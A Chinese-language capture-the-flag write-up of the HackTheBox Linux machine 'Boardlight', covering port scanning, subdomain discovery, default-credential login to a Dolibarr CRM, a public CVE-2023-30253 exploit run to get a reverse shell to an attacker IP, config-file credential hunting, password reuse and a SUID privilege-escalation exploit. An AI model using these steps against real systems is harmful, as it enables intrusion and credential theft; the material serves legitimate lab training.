---
title: "Boardlight"
description: "这篇HackTheBox Linux 靶机 Boardlight 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
summary: "这篇HackTheBox Linux 靶机 Boardlight 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
date: "2024-10-16T15:42:00+08:00"
publishDate: "2024-10-16T15:42:00+08:00"
lastmod: "2024-10-16T15:42:00+08:00"
url: "/hackthebox/linux/boardlight/"
image: "images/oscp-banners/banner-002.jpg"
draft: false
unfinished: false
categories:
  - "OSCP"
  - "HackTheBox"
tags:
  - "Linux"
oscp_provider: "HackTheBox"
oscp_platform: "Linux"
---
<!-- oscp-refactor:meta-start -->
> 平台：Linux ｜ 来源：HackTheBox
<!-- oscp-refactor:meta-end -->

对目标服务器的tcp端口进行扫描

```
sudo nmap -p- 10.10.11.11 -open
```

![image-20240918150728480](https://s2.loli.net/2024/09/18/iTsPUh2AIkqRH7G.png)

对目标服务器开放端口进行扫描

```
sudo nmap -p22,80 -A 10.10.11.11 -oX Boardlight.xml
```

![image-20240918150808261](https://files.seeusercontent.com/2026/04/07/0prH/image-20240918150808261.png)

通过检查22端口，无可继续利用的情况

对80端口的服务进行检查

发现了一个邮箱info@board.htb，优先在hosts文件中添加对应的域名内容

1.优先扫描对应路径是否存在可利用

![image-20240918154424331](https://s2.loli.net/2024/09/18/t6j5BLT78aQHWAv.png)

针对composer.phar进行了Google搜索，没有直观从现有收集的信息可以利用的点

考虑到前面发现的域名，对子域名进行扫描爆破进行探测

![image-20240918155713823](https://s2.loli.net/2024/09/18/RFYBgSNuexL3JsO.png)

发现一个子域名

crm.board.htb，将其添加到hosts文件中，并进行访问

![image-20240918155901305](https://s2.loli.net/2024/09/18/ehmWcRwgCaMpQBk.png)

从默认账号密码及可利用的poc角度对这个软件的版本进行搜索

默认账号密码：admin/admin

![image-20240918160232721](https://s2.loli.net/2024/09/18/CeyzxwajdgWNUpG.png)

优先进行登录尝试，发现能够登录，但权限页面受限

![image-20240918160838206](https://s2.loli.net/2024/09/18/By53T8vRx6Ynsqe.png)

我们还找到了一个exp可以利用反弹shell，进行尝试（https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253）

```
python3 exploit.py http://crm.board.htb admin admin 10.10.16.15 12345
```

![image-20240918161404816](https://s2.loli.net/2024/09/18/TmxRUejLgCBoIzl.png)

成功反弹回来一个shell，突破边界，检查/etc/passwd文件，具备bash的有两个用户，无法进入larissa的home目录下

![image-20240918161628949](https://s2.loli.net/2024/09/18/JwZd1qzKkHIrVty.png)

经过一番搜索，找到了一个/var/www/html/crm.board.htb/htdocs/conf/conf.php 文件中存在一个pass

```
find /var/www/ -type f \( -iname "*conf*" \) 2>/dev/null
```

![image-20240918171532538](https://files.seeusercontent.com/2026/04/06/hZ5l/image-20240918171532538.png)

user:dolibarrowner

pass:serverfun2$2023!!

抱着尝试的心态，使用这个密码su到之前查看/etc/passwd的larissa用户

![image-20240918171858217](https://s2.loli.net/2024/09/18/c3LkYHzybGMvUV7.png)

成功切换到larissa用户，访问到home目录下查看user.txt获取flag

通过执行linpeas.sh，发现以下suid问题

![image-20240918180341912](https://s2.loli.net/2024/09/18/Z9sh2zGPM7uFmoA.png)

使用enlightenment suid exploit 作为关键词进行检索，发现了一个可利用漏洞（https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit）

使用后成功切换到root权限

![image-20240918180714416](https://s2.loli.net/2024/09/18/N9HrxkUdBZmM4IL.png)

成功获取到flag

